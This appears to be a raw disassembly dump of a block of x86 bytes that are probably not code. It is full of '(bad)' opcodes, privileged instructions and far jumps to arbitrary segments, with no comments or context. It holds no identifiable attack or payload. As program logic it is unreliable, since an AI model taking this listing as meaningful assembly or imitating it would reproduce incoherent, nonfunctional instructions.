  4c41aa:	dec    ecx
  4c41ab:	int    0xf6
  4c41ad:	mov    ebx,0x190100bf
  4c41b2:	cmp    DWORD PTR [eax+ebp*1+0xc],esp
  4c41b6:	add    BYTE PTR [eax],cl
  4c41b8:	add    al,0xdb
  4c41ba:	push   edx
  4c41bb:	ins    BYTE PTR es:[edi],dx
  4c41bc:	popa   
  4c41bd:	aas    
  4c41be:	add    DWORD PTR [edx],ecx
  4c41c0:	jmp    0x4c41d4
  4c41c2:	inc    edx
  4c41c3:	adc    eax,DWORD PTR [ecx+0x4f5d05f7]
  4c41c9:	cmp    dh,BYTE PTR [edi]
  4c41cb:	add    dh,BYTE PTR [eax]
  4c41cd:	adc    BYTE PTR [ecx],ch
  4c41cf:	push   ss
  4c41d0:	mov    fs,WORD PTR [edi]
  4c41d2:	sti    
  4c41d3:	adc    BYTE PTR [ebx+0x2],dh
  4c41d6:	aaa    
  4c41d7:	outs   dx,DWORD PTR ds:[esi]
  4c41d8:	dec    ecx
  4c41d9:	call   FWORD PTR [esp+ebp*4-0xa]
  4c41dd:	add    al,0x5a
  4c41df:	addr16 push esi
  4c41e1:	ret    0x8137
  4c41e4:	aaa    
  4c41e5:	jno    0x4c41f3
  4c41e7:	rcl    DWORD PTR [esi-0x73f3a929],cl
  4c41ed:	jb     0x4c422e
  4c41ef:	mov    dl,0x34
  4c41f1:	push   es
  4c41f2:	(bad)  
  4c41f3:	xor    edx,DWORD PTR [eax-0x20fcc663]
  4c41f9:	sahf   
  4c41fa:	les    esi,FWORD PTR [edi+0xd]
  4c41fd:	cmovl  esi,DWORD PTR [ebx+0x67]
  4c4201:	repz xor BYTE PTR fs:[esi+0xb],bh
  4c4206:	jg     0x4c4269
  4c4208:	ret    
  4c4209:	sbb    BYTE PTR [esi+esi*2+0xb2ece4d],cl
  4c4210:	push   cs
  4c4211:	xor    eax,0x1780a620
  4c4216:	xor    edi,DWORD PTR cs:[edi]
  4c4219:	push   edx
  4c421a:	inc    ebp
  4c421b:	pop    ebp
  4c421c:	mov    ebx,0x72ed7
  4c4221:	shl    DWORD PTR [edx+0x2e37a90e],cl
  4c4227:	test   edi,0x4f3c1d64
  4c422d:	push   eax
  4c422e:	dec    edi
  4c422f:	jp     0x4c4200
  4c4231:	push   0x70b3c62
  4c4236:	pop    esp
  4c4237:	aaa    
  4c4238:	test   al,0x88
  4c423a:	(bad)  
  4c423b:	aam    0xfb
  4c423d:	fs dec edi
  4c423f:	test   DWORD PTR [edx+0x3b],eax
  4c4242:	outs   dx,DWORD PTR ds:[esi]
  4c4243:	ins    BYTE PTR es:[edi],dx
  4c4244:	sbb    dh,BYTE PTR [ebx-0x7d]
  4c4247:	push   cs
  4c4248:	popf   
  4c4249:	mov    DWORD PTR [ebx+0x777f1fbd],esp
  4c424f:	xchg   ebx,eax
  4c4250:	je     0x4c4234
  4c4252:	xchg   DWORD PTR [ecx+0x53f74762],esi
  4c4258:	mov    WORD PTR [esi+0x74876b44],es
  4c425e:	iret   
  4c425f:	ja     0x4c4204
  4c4261:	aad    0x85
  4c4263:	mov    BYTE PTR [edi-0x65],al
  4c4266:	jo     0x4c426f
  4c4268:	xor    BYTE PTR [esi+0x425b80df],bh
  4c426e:	addr16 je 0x4c4287
  4c4271:	push   esi
  4c4272:	adc    ebp,DWORD PTR [ecx-0x7df88071]
  4c4278:	ret    
  4c4279:	mov    ebx,0xbbd36c4e
  4c427e:	and    bl,BYTE PTR [edx+eax*8+0x3c]
  4c4282:	or     ch,BYTE PTR [ebx+0x6f]
  4c4285:	sahf   
  4c4286:	dec    ecx
  4c4287:	ret    0x30a5
  4c428a:	outs   dx,BYTE PTR ds:[esi]
  4c428b:	iret   
  4c428c:	jnp    0x4c4231
  4c428e:	lock outs dx,BYTE PTR ds:[esi]
  4c4290:	sbb    eax,0x590e227f
  4c4295:	test   DWORD PTR [ebx+edi*1+0x4726c246],0xb1a88b45
  4c42a0:	cmp    DWORD PTR [edi],esp
  4c42a2:	inc    esp
  4c42a3:	aas    
  4c42a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c42a5:	cmc    
  4c42a6:	ror    DWORD PTR [ebx+0x4fb425b2],1
  4c42ac:	xor    ch,BYTE PTR [esi+0x3e2c2134]
  4c42b2:	mov    edx,0x38b2369a
  4c42b7:	idiv   BYTE PTR [ecx-0x251d9053]
  4c42bd:	repnz inc ebp
  4c42bf:	jne    0x4c4283
  4c42c1:	mov    bh,0xda
  4c42c3:	jp     0x4c4260
  4c42c5:	pop    es
  4c42c6:	sub    eax,DWORD PTR [ecx+0x66]
  4c42c9:	adc    bh,BYTE PTR [esi+0x4c179355]
  4c42cf:	daa    
  4c42d0:	push   esp
  4c42d1:	test   BYTE PTR [edi-0x48aa97be],dh
  4c42d7:	jecxz  0x4c4341
  4c42d9:	jae    0x4c42ef
  4c42db:	mov    es,esi
  4c42dd:	push   esp
  4c42de:	das    
  4c42df:	adc    edi,DWORD PTR [edi+ebp*8+0x59afb851]
  4c42e6:	outs   dx,DWORD PTR ds:[esi]
  4c42e7:	dec    edi
  4c42e8:	pop    eax
  4c42e9:	xor    edi,DWORD PTR [ebx]
  4c42eb:	ss (bad) 
  4c42ed:	ins    BYTE PTR es:[edi],dx
  4c42ee:	das    
  4c42ef:	push   edx
  4c42f0:	dec    esi
  4c42f1:	xchg   DWORD PTR [ebp+ecx*2+0x67465c2c],ebp
  4c42f8:	add    BYTE PTR [ebx],dl
  4c42fa:	iret   
  4c42fb:	push   edx
  4c42fc:	clc    
  4c42fd:	ins    BYTE PTR es:[edi],dx
  4c42fe:	lahf   
  4c42ff:	inc    ecx
  4c4300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c4301:	pop    ds
  4c4302:	or     DWORD PTR [edi],edi
  4c4304:	mov    WORD PTR ds:0x934787c7,es
  4c430a:	out    dx,eax
  4c430b:	push   cs
  4c430c:	cmp    ch,bl
  4c430e:	inc    edx
  4c430f:	xor    eax,DWORD PTR [eax]
  4c4311:	sbb    eax,DWORD PTR [ebx-0x25]
  4c4314:	push   cs
  4c4315:	mov    es,WORD PTR [ebp+0xf9b2f52]
  4c431b:	ja     0x4c432d
  4c431d:	jl     0x4c432e
  4c431f:	outs   dx,BYTE PTR ds:[esi]
  4c4320:	xchg   esi,eax
  4c4321:	iret   
  4c4322:	inc    ebp
  4c4323:	push   edi
  4c4324:	push   ebx
  4c4325:	(bad)  
  4c4326:	in     al,dx
  4c4327:	push   ebx
  4c4328:	pop    eax
  4c4329:	jo     0x4c437e
  4c432b:	jg     0x4c4370
  4c432d:	sbb    esi,eax
  4c432f:	dec    eax
  4c4330:	dec    eax
  4c4331:	dec    ebx
  4c4332:	inc    edi
  4c4333:	dec    ebx
  4c4334:	inc    ebx
  4c4335:	test   eax,0x776b62d
  4c433a:	xchg   DWORD PTR [ebx],esi
  4c433c:	fild   QWORD PTR [ebx-0x8]
  4c433f:	adc    al,0x6
  4c4341:	ds mov edi,0x7821b61f
  4c4347:	imul   esp,DWORD PTR [edi],0x4f
  4c434a:	out    0x45,eax
  4c434c:	daa    
  4c434d:	mov    eax,0x2abde166
  4c4352:	movzx  eax,WORD PTR [esi-0x6d]
  4c4356:	ja     0x4c42f3
  4c4358:	nop
  4c4359:	out    dx,eax
  4c435a:	push   ebp
  4c435b:	mov    ebx,0xbb444e4c
  4c4360:	(bad)  
  4c4361:	fld    DWORD PTR [edx+0x48174b57]
  4c4367:	cmp    edi,DWORD PTR [ebp+0x2b6e2b14]
  4c436d:	dec    ecx
  4c436e:	pop    ss
  4c436f:	xchg   ebx,eax
  4c4370:	sbb    ecx,DWORD PTR [esi+0x1fad9bdd]
  4c4376:	fisttp WORD PTR [eax+0x57]
  4c4379:	add    BYTE PTR [edi],bh
  4c437b:	dec    esi
  4c437c:	pop    ebp
  4c437d:	add    ch,ah
  4c437f:	adc    al,0x17
  4c4381:	daa    
  4c4382:	inc    ecx
  4c4383:	ins    DWORD PTR es:[edi],dx
  4c4384:	shl    DWORD PTR [esi-0x1903c43],0x3e
  4c438b:	clc    
  4c438c:	adc    cl,BYTE PTR ss:[esi-0x10462dd8]
  4c4393:	push   0x6f
  4c4395:	and    ecx,DWORD PTR [ecx+0x100e7be6]
  4c439b:	push   es
  4c439c:	mov    ch,0x27
  4c439e:	add    DWORD PTR [eax-0x9],0xffffff9e
  4c43a2:	test   al,0x5d
  4c43a4:	scas   al,BYTE PTR es:[edi]
  4c43a5:	das    
  4c43a6:	fild   WORD PTR [edi+0x6b]
  4c43a9:	pop    esi
  4c43aa:	jnp    0x4c43f2
  4c43ac:	jle    0x4c43cb
  4c43ae:	jge    0x4c436d
  4c43b0:	(bad)  
  4c43b1:	pop    esi
  4c43b2:	and    eax,0x670e310e
  4c43b7:	aaa    
  4c43b8:	js     0x4c4417
  4c43ba:	gs aam 0xf6
  4c43bd:	push   ds
  4c43be:	jo     0x4c43b7
  4c43c0:	outs   dx,DWORD PTR ds:[esi]
  4c43c2:	inc    esi
  4c43c3:	push   edx
  4c43c4:	out    0xbb,eax
  4c43c6:	jle    0x4c43f7
  4c43c8:	jae    0x4c43a9
  4c43ca:	xor    al,0x0
  4c43cc:	fs jo  0x4c4378
  4c43cf:	push   esp
  4c43d0:	pop    ebx
  4c43d1:	loop   0x4c43e2
  4c43d3:	outs   dx,BYTE PTR ds:[esi]
  4c43d4:	bound  edi,QWORD PTR [edi-0x6]
  4c43d7:	aaa    
  4c43d8:	xchg   ebx,eax
  4c43d9:	out    dx,eax
  4c43da:	sub    edx,DWORD PTR [ebx]
  4c43dc:	inc    ebp
  4c43dd:	inc    ecx
  4c43de:	xor    BYTE PTR [esi],dh
  4c43e0:	wrmsr  
  4c43e2:	xor    bl,BYTE PTR [eax+0x36]
  4c43e5:	adc    dh,BYTE PTR [ebx]
  4c43e7:	adc    esp,DWORD PTR [edi+0x21]
  4c43ea:	pop    edi
  4c43eb:	cmp    DWORD PTR [edx],0x7b
  4c43ee:	mov    ebp,0x67572a03
  4c43f3:	inc    esi
  4c43f4:	dec    ecx
  4c43f5:	(bad)  
  4c43f6:	vpsubsw ymm7,ymm5,YMMWORD PTR [edi-0x6d48acc9]
  4c43fe:	loop   0x4c4424
  4c4400:	cs aas 
  4c4402:	mov    bh,0x9d
  4c4404:	les    ecx,FWORD PTR [esi+0x62]
  4c4407:	mov    ds:0x171314af,eax
  4c440c:	mov    al,0x67
  4c440e:	add    BYTE PTR [edi+0x2ca5c7d0],dh
  4c4414:	push   ss
  4c4415:	pop    es
  4c4416:	pop    ebx
  4c4417:	fisubr WORD PTR [ebx+0x6d]
  4c441a:	sbb    eax,0x320a2797
  4c441f:	dec    eax
  4c4420:	test   DWORD PTR [edi-0x7a],ebx
  4c4423:	pop    ebx
  4c4424:	das    
  4c4425:	addr16 pop edi
  4c4427:	pop    eax
  4c4428:	pop    eax
  4c4429:	ins    BYTE PTR es:[edi],dx
  4c442a:	test   al,0xf7
  4c442c:	dec    ecx
  4c442d:	das    
  4c442e:	test   eax,0x1fe3422d
  4c4433:	lahf   
  4c4434:	outs   dx,DWORD PTR ds:[esi]
  4c4435:	jge    0x4c4447
  4c4437:	outs   dx,DWORD PTR ds:[esi]
  4c4438:	bound  eax,QWORD PTR [ebx+0x40]
  4c443b:	sub    esp,DWORD PTR [ebx+0x31]
  4c443e:	ss push es
  4c4440:	out    dx,eax
  4c4441:	mov    ds:0xaf261e27,eax
  4c4446:	test   DWORD PTR cs:[edi],eax
  4c4449:	sbb    bh,BYTE PTR [ebx+0x61f4a1f]
  4c444f:	addr16 jbe 0x4c4488
  4c4452:	retf   
  4c4453:	push   edi
  4c4454:	inc    edi
  4c4455:	or     DWORD PTR [ebp+0x2c],0x54
  4c4459:	sbb    ah,bh
  4c445b:	inc    edi
  4c445c:	inc    ebx
  4c445d:	imul   eax,DWORD PTR [ebx],0x76
  4c4460:	ins    DWORD PTR es:[edi],dx
  4c4461:	mov    ds:0x7c167337,eax
  4c4466:	fld    TBYTE PTR [eax+0x37]
  4c4469:	pop    ds
  4c446a:	jae    0x4c44c0
  4c446c:	dec    ebx
  4c446d:	mov    dh,0xd2
  4c446f:	sbb    ch,ch
  4c4471:	sbb    ch,BYTE PTR [edi]
  4c4473:	das    
  4c4474:	das    
  4c4475:	stos   DWORD PTR es:[edi],eax
  4c4476:	shl    DWORD PTR [esi+0x25],1
  4c4479:	mov    edi,0x22b6732f
  4c447e:	fisubr WORD PTR [edx-0x85d0cd]
  4c4484:	xor    al,0xee
  4c4486:	sti    
  4c4487:	push   cs
  4c4488:	dec    ebp
  4c4489:	or     ecx,DWORD PTR [ecx+0xf]
  4c448c:	pop    edx
  4c448d:	cs inc ebp
  4c448f:	mov    ebx,0x275ffab2
  4c4494:	pop    ss
  4c4495:	dec    edi
  4c4496:	jmp    0x4c4462
  4c4498:	xor    BYTE PTR [ebp-0x1f8410c1],0x62
  4c449f:	mov    ebx,0x32455707
  4c44a4:	inc    edi
  4c44a5:	mov    ebp,DWORD PTR [esi]
  4c44a7:	js     0x4c4490
  4c44a9:	fcom   DWORD PTR [edx+0x1f]
  4c44ac:	dec    ebx
  4c44ad:	mov    eax,edi
  4c44af:	inc    edi
  4c44b0:	pop    ebx
  4c44b1:	xlat   BYTE PTR ds:[ebx]
  4c44b2:	mov    dh,0x40
  4c44b4:	das    
  4c44b5:	ja     0x4c44e6
  4c44b7:	(bad)  
  4c44b8:	fldcw  WORD PTR [edx]
  4c44ba:	pop    eax
  4c44bb:	imul   DWORD PTR [edi]
  4c44bd:	push   eax
  4c44be:	sti    
  4c44bf:	jbe    0x4c4475
  4c44c1:	(bad)  
  4c44c2:	ret    0x6f43
  4c44c5:	push   ebx
  4c44c6:	aaa    
  4c44c7:	dec    edi
  4c44c8:	daa    
  4c44c9:	bound  ebp,QWORD PTR ds:0x37978c74
  4c44cf:	aad    0x36
  4c44d1:	fdivr  st(1),st
  4c44d3:	stos   DWORD PTR es:[edi],eax
  4c44d4:	dec    ecx
  4c44d5:	aaa    
  4c44d6:	push   ebx
  4c44d7:	add    eax,DWORD PTR [edi+0x36]
  4c44da:	or     ch,BYTE PTR [esi+0x3fcf038d]
  4c44e0:	fwait
  4c44e1:	mov    dh,0x36
  4c44e3:	ret    0xfba2
  4c44e6:	jg     0x4c452e
  4c44e8:	jae    0x4c446c
  4c44ea:	retf   
  4c44eb:	mov    ah,0x76
  4c44ed:	dec    eax
  4c44ee:	daa    
  4c44ef:	das    
  4c44f0:	mov    cl,BYTE PTR [edi-0x55]
  4c44f3:	and    eax,eax
  4c44f5:	mov    cl,0xb7
  4c44f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c44f8:	sbb    BYTE PTR [esi+0x2f276b0d],bh
  4c44fe:	adc    edx,DWORD PTR [edx-0x71]
  4c4501:	cmp    ebx,DWORD PTR [eax]
  4c4503:	add    ah,dl
  4c4505:	pop    ecx
  4c4506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c4507:	push   ebp
  4c4508:	ficom  WORD PTR [eax-0x35]
  4c450b:	pop    ebp
  4c450c:	pop    ebx
  4c450d:	dec    esp
  4c450e:	fdivr  QWORD PTR [esi]
  4c4510:	sbb    ebp,DWORD PTR [edi]
  4c4512:	dec    eax
  4c4513:	sub    DWORD PTR [ebp-0x3b],0x2f2f12c4
  4c451a:	sbb    eax,0x3b5b717b
  4c451f:	pop    ds
  4c4520:	push   edx
  4c4521:	fist   WORD PTR [esi+0x1f]
  4c4524:	dec    edi
  4c4525:	and    BYTE PTR [esi+0x5fbfed20],ah
  4c452b:	outs   dx,DWORD PTR ds:[esi]
  4c452c:	push   ebx
  4c452d:	sbb    eax,0xbfe41b5c
  4c4532:	push   cs
  4c4533:	iret   
  4c4534:	inc    edx
  4c4535:	imul   edx,DWORD PTR [esi-0x43],0xffffff8f
  4c4539:	fwait
  4c453a:	lahf   
  4c453b:	inc    edx
  4c453c:	inc    edx
  4c453d:	sti    
  4c453e:	aas    
  4c453f:	pop    ebx
  4c4540:	or     DWORD PTR [ebp+0x6b],0x1f509b0f
  4c4547:	sbb    ebp,DWORD PTR [ebx-0x14149297]
  4c454d:	dec    esp
  4c454e:	cmp    ebx,DWORD PTR [edi+0x2b]
  4c4551:	jo     0x4c459f
  4c4553:	inc    esp
  4c4554:	push   0xeb493b37
  4c4559:	mov    edx,0x47c38ed5
  4c455e:	sub    ah,BYTE PTR [edi]
  4c4560:	(bad)  
  4c4561:	push   0x733f6a5b
  4c4566:	das    
  4c4567:	pop    ebx
  4c4568:	sbb    eax,0xcfc1dad3
  4c456d:	sbb    edx,DWORD PTR [bp+di+0x22]
  4c4571:	pop    eax
  4c4572:	ins    DWORD PTR es:[edi],dx
  4c4573:	adc    DWORD PTR [ebx+0x51b0773f],ebx
  4c4579:	shl    DWORD PTR [esi],0x47
  4c457c:	aas    
  4c457d:	xlat   BYTE PTR ds:[ebx]
  4c457e:	pop    edx
  4c457f:	and    eax,0x4747c917
  4c4584:	adc    DWORD PTR [ecx],esi
  4c4586:	fisubr DWORD PTR [edx+0x3b]
  4c4589:	inc    edi
  4c458a:	out    0xec,eax
  4c458c:	ror    DWORD PTR [ebx],0x6d
  4c458f:	xchg   DWORD PTR [edi+0x5f],esi
  4c4592:	inc    edi
  4c4593:	das    
  4c4594:	scas   al,BYTE PTR es:[edi]
  4c4595:	in     al,dx
  4c4596:	mov    ebx,DWORD PTR [eax]
  4c4598:	outs   dx,DWORD PTR ds:[esi]
  4c4599:	out    0x73,eax
  4c459b:	mov    dh,BYTE PTR [edi-0x38c02773]
  4c45a1:	aas    
  4c45a2:	jecxz  0x4c45df
  4c45a4:	and    al,0xce
  4c45a6:	test   DWORD PTR [edi],ecx
  4c45a8:	jle    0x4c45cd
  4c45aa:	push   ebx
  4c45ab:	cli    
  4c45ac:	out    0xc2,al
  4c45ae:	fisub  DWORD PTR [edi]
  4c45b0:	push   ebx
  4c45b1:	inc    esi
  4c45b2:	daa    
  4c45b3:	inc    ebx
  4c45b4:	pop    ebx
  4c45b5:	inc    ebp
  4c45b6:	fld    TBYTE PTR [edx]
  4c45b8:	iret   
  4c45b9:	das    
  4c45ba:	iret   
  4c45bb:	das    
  4c45bc:	pop    ebx
  4c45bd:	shl    DWORD PTR [esi-0x30e03098],1
  4c45c3:	pop    ds
  4c45c4:	add    cl,0x2a
  4c45c7:	sub    BYTE PTR [edi],al
  4c45c9:	sub    bl,BYTE PTR [edi]
  4c45cb:	arpl   bp,bp
  4c45cd:	test   al,0xde
  4c45cf:	das    
  4c45d0:	inc    DWORD PTR [ebp-0x69]
  4c45d3:	call   0xaf4e:0x53988d2e
  4c45da:	cs aaa 
  4c45dc:	sbb    al,0xf1
  4c45de:	jmp    0xc18f:0x43973f0d
  4c45e5:	and    ebp,DWORD PTR [esi]
  4c45e7:	push   cs
  4c45e8:	mov    bh,0xb
  4c45ea:	mov    bh,0xe7
  4c45ec:	mov    cl,0x4f
  4c45ee:	pop    esp
  4c45f0:	xchg   edi,eax
  4c45f1:	fist   WORD PTR [edx+0x2f]
  4c45f4:	or     ecx,DWORD PTR [esp+eax*8-0x8b2ec94]
  4c45fb:	aas    
  4c45fc:	bound  ebp,QWORD PTR [ebx+0x24]
  4c45ff:	push   esi
  4c4600:	out    dx,eax
  4c4601:	aas    
  4c4602:	aad    0xae
  4c4604:	mov    cl,0xea
  4c4606:	dec    edi
  4c4607:	xor    edx,DWORD PTR [ebx]
  4c4609:	aas    
  4c460a:	(bad)
  4c460d:	mov    WORD PTR [edi+0x46],gs
  4c4610:	dec    ecx
  4c4611:	jbe    0x4c464a
  4c4613:	xor    DWORD PTR [ebp+esi*4+0x4f],ebp
  4c4617:	pop    ss
  4c4618:	push   eax
  4c4619:	mov    cs,WORD PTR [esi+esi*4-0x1dc84ee8]
  4c4620:	aaa    
  4c4621:	mov    BYTE PTR [eax+0x14],ah
  4c4624:	cmp    al,0x93
  4c4626:	outs   dx,DWORD PTR ds:[esi]
  4c4627:	lahf   
  4c4628:	test   BYTE PTR [eax-0x64],0x45
  4c462c:	cmp    esp,DWORD PTR [edx-0x59]
  4c462f:	aaa    
  4c4630:	add    al,0x5b
  4c4632:	or     BYTE PTR [ebp+0x40ec4fcf],ch
  4c4638:	mov    eax,ds:0x27a78f20
  4c463d:	popa   
  4c463e:	xor    eax,0x577748b4
  4c4643:	test   DWORD PTR [eax+ebx*1+0x4fa6c546],0x8eec16cf
  4c464e:	jp     0x4c46a7
  4c4650:	pop    eax
  4c4651:	push   edi
  4c4652:	push   ss
  4c4653:	aas    
  4c4654:	popf   
  4c4655:	les    eax,FWORD PTR [ebp-0x70c938d8]
  4c465b:	pop    ss
  4c465c:	and    bl,BYTE PTR [eax]
  4c465e:	ins    DWORD PTR es:[edi],dx
  4c465f:	aaa    
  4c4660:	aas    
  4c4661:	ss mov esi,0x87135dab
  4c4667:	das    
  4c4668:	inc    esi
  4c4669:	imul   eax,DWORD PTR [ecx-0x5d],0xffffffad
  4c466d:	pusha  
  4c466e:	shl    BYTE PTR [edi],0x4b
  4c4671:	aaa    
  4c4672:	dec    edx
  4c4673:	pop    edx
  4c4674:	sub    eax,0xb37171d
  4c4679:	sub    eax,0x86cbcbd8
  4c467e:	aaa    
  4c467f:	arpl   WORD PTR [esp+edi*1],dx
  4c4682:	sub    BYTE PTR [edi+esi*1+0x1c017743],dh
  4c4689:	lods   eax,DWORD PTR ds:[esi]
  4c468a:	xor    BYTE PTR [esi-0x51],al
  4c468d:	dec    ebp
  4c468e:	neg    DWORD PTR [eax+0xd]
  4c4691:	test   DWORD PTR [ebp+0x31af56c7],0xeb970e92
  4c469b:	ja     0x4c46ef
  4c469d:	ficom  DWORD PTR [edx-0x2f]
  4c46a0:	xchg   DWORD PTR [edi],ebx
  4c46a2:	daa    
  4c46a3:	xchg   DWORD PTR [edx-0x45],ebx
  4c46a6:	idiv   edx
  4c46a8:	push   ebx
  4c46a9:	bound  esi,QWORD PTR [ebx+0x56]
  4c46ac:	das    
  4c46ad:	pop    eax
  4c46ae:	dec    ebx
  4c46af:	aad    0x4b
  4c46b1:	(bad)  
  4c46b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c46b3:	das    
  4c46b4:	xor    edx,esi
  4c46b6:	xchg   esp,eax
  4c46b7:	xchg   esi,eax
  4c46b8:	xlat   BYTE PTR ds:[ebx]
  4c46b9:	push   edx
  4c46ba:	das    
  4c46bb:	dec    ebx
  4c46bc:	lea    esp,[eax+0x30]
  4c46bf:	fimul  DWORD PTR [edi+0x54c43a5f]
  4c46c5:	mov    BYTE PTR [edi],cl
  4c46c7:	sub    dl,BYTE PTR [edx-0x1]
  4c46ca:	push   ebx
  4c46cb:	jbe    0x4c473b
  4c46cd:	sbb    ah,ah
  4c46cf:	aas    
  4c46d0:	push   cs
  4c46d1:	outs   dx,DWORD PTR ds:[esi]
  4c46d2:	push   ecx
  4c46d3:	aaa    
  4c46d4:	scas   eax,DWORD PTR es:[edi]
  4c46d5:	mov    cl,0x5d
  4c46d7:	sbb    BYTE PTR [eax-0x61],dl
  4c46da:	div    BYTE PTR [di-0x3b23]
  4c46df:	push   0xa27c737
  4c46e4:	mov    bh,0x4b
  4c46e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c46e7:	das    
  4c46e8:	fisub  WORD PTR [ebx+0x53]
  4c46eb:	jecxz  0x4c46a9
  4c46ed:	cmp    DWORD PTR [eax+0x3a57e31b],esi
  4c46f3:	push   esi
  4c46f4:	xor    al,0x6
  4c46f6:	mov    ebx,0x4f00d742
  4c46fb:	or     eax,0x23add0f8
  4c4700:	adc    edi,DWORD PTR es:[ebx+0x4a43ad28]
  4c4707:	out    0x40,eax
  4c4709:	fisttp DWORD PTR [ecx+eax*2+0xb471b6b]
  4c4710:	sub    al,0x58
  4c4712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c4713:	inc    edi
  4c4714:	mov    bh,0x47
  4c4716:	jmp    0x4c46ac
  4c4718:	xchg   esi,eax
  4c4719:	mov    esp,0xe3f7442e
  4c471e:	sar    BYTE PTR [eax+0x2b4b8b02],1
  4c4724:	dec    esp
  4c4725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c4726:	sub    eax,0xa73f7f54
  4c472b:	push   ebp
  4c472c:	call   0x371f:0x276ab6c3
  4c4733:	daa    
  4c4734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c4735:	adc    BYTE PTR [edi],dh
  4c4737:	mov    dh,0x17
  4c4739:	push   cs
  4c473a:	imul   ecx,DWORD PTR [ebx-0x7883ae94],0xffffffd7
  4c4741:	daa    
  4c4742:	retf   
  4c4743:	sub    ebx,DWORD PTR [ebp-0x58]
  4c4746:	mov    ch,0x47
  4c4748:	push   ebx
  4c4749:	push   esi
  4c474a:	fcmovnu st,st(3)
  4c474c:	inc    edx
  4c474d:	arpl   WORD PTR [edi+ebp*1+0x1d6a2fcb],si
  4c4754:	mov    DWORD PTR [ecx],ecx
  4c4756:	retf   
  4c4757:	add    ebx,esi
  4c4759:	xor    DWORD PTR [esi],esi
  4c475b:	cmp    eax,0xdbef57af
  4c4760:	mov    ss,ebp
  4c4762:	push   ds
  4c4763:	mov    esi,0x272f273b
  4c4768:	cwde   
  4c4769:	icebp  
  4c476a:	mov    cl,0xda
  4c476c:	das    
  4c476d:	das    
  4c476e:	jg     0x4c4791
  4c4770:	mov    dh,0xa
  4c4772:	xchg   esp,eax
  4c4773:	mov    edi,0x41de9c47
  4c4778:	push   0x3a27032f
  4c477d:	jnp    0x4c4741
  4c477f:	push   0x37
  4c4781:	das    
  4c4782:	pop    ecx
  4c4783:	jg     0x4c47f4
  4c4785:	jg     0x4c47ef
  4c4787:	pop    es
  4c4788:	and    DWORD PTR [edx+0x4b],edx
  4c478b:	push   ebx
  4c478c:	aas    
  4c478d:	add    eax,0x57c66dab
  4c4792:	aaa    
  4c4793:	pop    edi
  4c4794:	(bad)  
  4c4797:	sbb    ch,BYTE PTR [ebx-0x49]
  4c479a:	dec    ebx
  4c479b:	loope  0x4c47aa
  4c479d:	ins    BYTE PTR es:[edi],dx
  4c479e:	mov    ah,0x2f
  4c47a0:	arpl   WORD PTR [eax+0x22],dx
  4c47a3:	pop    eax
  4c47a4:	mov    ah,0xb6
  4c47a6:	data16 jecxz 0x4c4794
  4c47a9:	jmp    0x4c47da
  4c47ab:	sbb    ebp,DWORD PTR [ebx+ecx*2+0x526b8fa1]
  4c47b2:	aaa    
  4c47b3:	push   edi
  4c47b4:	mov    dh,0x45
  4c47b6:	sub    ah,BYTE PTR [ebx+0x379ed745]
  4c47bc:	mov    ah,0xca
  4c47be:	js     0x4c477b
  4c47c0:	(bad)  
  4c47c1:	jmp    edi
  4c47c3:	(bad)  
  4c47c4:	dec    ebp
  4c47c5:	pop    edx
  4c47c6:	adc    DWORD PTR [ebx+0x23],edx
  4c47c9:	sahf   
  4c47ca:	mov    cl,0xdb
  4c47cc:	test   DWORD PTR ds:0x5fba9bef,edx
  4c47d2:	bound  esp,QWORD PTR [esp+eax*1-0x5b71a8a5]
  4c47d9:	sub    eax,0x1f4f16d8
  4c47de:	addr16 aas 
  4c47e0:	mov    ds:0x874eb6c4,al
  4c47e5:	daa    
  4c47e6:	add    edi,ebx
  4c47e8:	rol    BYTE PTR [ebp-0x2cb91cba],0x4f
  4c47ef:	imul   esp,DWORD PTR [esp+eax*8-0x792cfffb],0x78
  4c47f7:	cwde   
  4c47f8:	cmp    BYTE PTR [eax+0x1757c758],ah
  4c47fe:	mov    ah,0x4b
  4c4800:	sub    al,0x76
  4c4802:	sub    ch,BYTE PTR [edi]
  4c4804:	adc    ebx,DWORD PTR [edi]
  4c4806:	adc    eax,0x3fa45b5a
  4c480b:	daa    
  4c480c:	addr16 push ds
  4c480e:	cmc    
  4c480f:	pop    edx
  4c4810:	ins    DWORD PTR es:[edi],dx
  4c4811:	das    
  4c4812:	das    
  4c4813:	push   edx
  4c4814:	outs   dx,DWORD PTR ds:[esi]
  4c4815:	push   edx
  4c4816:	xchg   ecx,eax
  4c4817:	xchg   esi,eax
  4c4818:	scas   al,BYTE PTR es:[edi]
  4c4819:	lds    esi,FWORD PTR [edi-0x1d69d81d]
  4c481f:	jmp    0x83907fcc
  4c4824:	pop    ss
  4c4825:	aas    
  4c4826:	call   0xf44:0x2fad8ef1
  4c482d:	pop    ebx
  4c482e:	jo     0x4c48a8
  4c4830:	xlat   BYTE PTR ds:[ebx]
  4c4831:	cmp    dl,BYTE PTR [ebx+0x57]
  4c4834:	sub    edx,0x78
  4c4837:	dec    ebx
  4c4838:	pop    ss
  4c4839:	cmp    cl,BYTE PTR [edi+0x27]
  4c483c:	push   eax
  4c483d:	pop    ss
  4c483e:	test   DWORD PTR [edx],esp
  4c4840:	jmp    0x696:0x37175f6d
  4c4847:	call   0xf7277016
  4c484c:	dec    edi
  4c484d:	add    esi,ebp
  4c484f:	pop    ebx
  4c4850:	adc    eax,0x36481747
  4c4855:	dec    edi
  4c4856:	dec    ebx
  4c4857:	cs push esp
  4c4859:	popa   
  4c485a:	dec    edi
  4c485b:	pop    ds
  4c485c:	pusha  
  4c485d:	in     eax,dx
  4c485e:	sbb    eax,0xba0b7b5c
  4c4863:	inc    ebx
  4c4864:	das    
  4c4865:	xor    ebp,DWORD PTR [esi-0x30541ee3]
  4c486b:	jg     0x4c48af
  4c486d:	xchg   edi,eax
  4c486e:	mov    eax,0x1f2d8950
  4c4873:	xlat   BYTE PTR ds:[ebx]
  4c4874:	es out 0xd2,al
  4c4877:	ins    DWORD PTR es:[edi],dx
  4c4878:	dec    ebp
